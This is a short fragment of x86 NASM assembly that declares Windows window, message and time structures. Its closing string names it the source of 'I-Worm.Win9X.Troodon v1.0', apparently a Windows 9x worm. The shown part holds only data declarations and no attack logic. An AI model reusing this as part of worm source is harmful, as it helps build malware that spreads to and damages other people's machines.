rect:   ISTRUC RECT
    at RECT.left,           dd  0
    at RECT.top,            dd  0
    at RECT.right,          dd  0
    at RECT.bottom,         dd  0
    IEND

WindowClassStruc:
ISTRUC WNDCLASS
    at WNDCLASS.style,            dd    0
    at WNDCLASS.lpfnWndProc,      dd    WndProc
    at WNDCLASS.cbClsExtra,       dd    0
    at WNDCLASS.cbWndExtra,       dd    0
    at WNDCLASS.hInstance,        dd    0
    at WNDCLASS.hIcon,            dd    NULL
    at WNDCLASS.hCursor,          dd    NULL
    at WNDCLASS.hbrBackground,    dd    1
    at WNDCLASS.lpszMenuName,     dd    NULL
    at WNDCLASS.lpszClassName,    dd    ClassName
IEND

WindowMSG:
ISTRUC MSG
    at MSG.hwnd,                dd    0
    at MSG.message,             dd    0
    at MSG.wParam,              dd    0
    at MSG.lParam,              dd    0
    at MSG.time,                dd    0
IEND

STime:
ISTRUC SYSTEMTIME
    at SYSTEMTIME.wYear,        dw  0
    at SYSTEMTIME.wMonth,       dw  0
    at SYSTEMTIME.wDayOfWeek,   dw  0
    at SYSTEMTIME.wDay,     dw  0
    at SYSTEMTIME.wHour,        dw  0
    at SYSTEMTIME.wMinute,      dw  0
    at SYSTEMTIME.wSecond,      dw  0
    at SYSTEMTIME.wMilliseconds,    dw  0
IEND

copyright           db  'I-Worm.Win9X.Troodon v1.0 Project', 13, 10
                db  'Developed by Clau.', 0

end:
